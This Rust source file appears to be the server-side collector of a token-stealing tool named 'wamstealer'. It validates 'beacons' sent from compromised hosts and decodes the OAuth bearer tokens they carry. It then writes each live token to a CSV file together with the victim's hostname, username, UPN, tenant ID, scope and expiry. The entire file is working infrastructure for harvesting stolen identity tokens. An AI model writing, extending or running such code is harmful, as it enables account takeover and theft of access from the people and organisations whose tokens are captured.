//! Beacon validation and CSV storage. Tokens are re-decoded server side; any
//! token whose payload cannot be parsed is treated as junk and rejected.

use wamstealer::beacon::{decode_claims, Beacon, Outcome};
use chrono::{DateTime, SecondsFormat, Utc};
use serde_json::Value;
use std::path::Path;

pub struct CapturedRow {
    pub timestamp_utc: String,
    pub hostname: String,
    pub host_username: String,
    pub upn: String,
    pub tenant_id: String,
    pub client_id: String,
    pub scope: String,
    pub expires_utc: String,
    pub token: String,
}

pub struct Processed {
    pub rows: Vec<CapturedRow>,
    pub errors: Vec<(Option<String>, Value)>,
    pub rejected: usize,
}

pub fn process(beacon: &Beacon, now: DateTime<Utc>) -> Processed {
    let timestamp = now.to_rfc3339_opts(SecondsFormat::Secs, true);
    let mut rows = Vec::new();
    let mut errors = Vec::new();
    let mut rejected = 0usize;
    for outcome in &beacon.results {
        match outcome {
            Outcome::Ok { username, token, .. } => match decode_claims(token) {
                Some(claims) => {
                    let expires = claims
                        .exp
                        .and_then(|exp| DateTime::from_timestamp(exp, 0))
                        .map(|expiry| expiry.to_rfc3339_opts(SecondsFormat::Secs, true))
                        .unwrap_or_default();
                    rows.push(CapturedRow {
                        timestamp_utc: timestamp.clone(),
                        hostname: beacon.hostname.clone(),
                        host_username: beacon.username.clone(),
                        upn: claims
                            .upn
                            .clone()
                            .or_else(|| username.clone())
                            .unwrap_or_default(),
                        tenant_id: claims.tid.clone().unwrap_or_default(),
                        client_id: beacon.client_id.clone(),
                        scope: claims
                            .scp
                            .clone()
                            .unwrap_or_else(|| beacon.scope.clone()),
                        expires_utc: expires,
                        token: token.clone(),
                    });
                }
                None => rejected += 1,
            },
            Outcome::Error { username, error, .. } => {
                errors.push((username.clone(), error.clone()));
            }
        }
    }
    Processed { rows, errors, rejected }
}

pub const CSV_HEADER: [&str; 9] = [
    "timestamp_utc",
    "hostname",
    "host_username",
    "upn",
    "tenant_id",
    "client_id",
    "scope",
    "expires_utc",
    "token",
];

/// Append rows to the CSV, writing the header when the file is new. The file
/// is created with owner-only permissions: it contains live bearer tokens.
pub fn append_csv(path: &Path, rows: &[CapturedRow]) -> std::io::Result<usize> {
    use std::fs::OpenOptions;
    if rows.is_empty() {
        return Ok(0);
    }
    let new_file = !path.exists();
    let mut options = OpenOptions::new();
    options.create(true).append(true);
    #[cfg(unix)]
    {
        use std::os::unix::fs::OpenOptionsExt;
        options.mode(0o600);
    }
    let file = options.open(path)?;
    // A pre-created but empty file still needs the header.
    let empty_file = file.metadata()?.len() == 0;
    let mut writer = csv::Writer::from_writer(file);
    if new_file || empty_file {
        writer.write_record(CSV_HEADER)?;
    }
    for row in rows {
        writer.write_record([
            row.timestamp_utc.as_str(),
            row.hostname.as_str(),
            row.host_username.as_str(),
            row.upn.as_str(),
            row.tenant_id.as_str(),
            row.client_id.as_str(),
            row.scope.as_str(),
            row.expires_utc.as_str(),
            row.token.as_str(),
        ])?;
    }
    writer.flush()?;
    Ok(rows.len())
}
